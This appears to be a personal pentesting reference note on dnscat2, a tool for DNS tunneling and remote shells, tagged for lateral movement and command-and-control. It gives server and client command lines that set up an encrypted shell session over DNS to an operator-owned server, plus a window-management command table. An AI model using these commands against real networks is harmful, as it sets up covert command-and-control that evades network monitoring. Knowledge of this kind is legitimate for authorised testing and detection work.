---
tags:
  - "#type/tool"
  - "#attack/lateral-movement"
  - "#attack/command-and-control"
Link: https://github.com/iagox86/dnscat2
Purpose: dns remote shell & tunneling tool
---
# Info

Uses a dedicated client & server to create an encrypted session using [[2 Tech-Specifics/Network/Protocols/DNS|DNS]].

Uses _CNAME_, _TXT_, and _MX_ queries and responses for tunneling data.

# Usage

**Server:**

`dnscat2-server <domain>`

The server is set up on a DNS server you own. - if DNS servers are not restricted by the target environment, this can be any server.

Once a client connected to the server, each connection is a "window". If you open a shell, another window is created. --> ctrl+z to go to main thread, then interact with shell window

| Command              | Purpose                           |
| -------------------- | --------------------------------- |
| `?`                  | help                              |
| `<command>` --help   | get help about specific command   |
| `listen`             | ssh like local port forwarding    |
| `windows`            | list windows                      |
| `window -i <number>` | interact with a window/connection |

**Client:**

`./dnscat <domain>` or `./dnscat --dns server=x.x.x.x,port=53`

client opens a command session per default

# Snippets
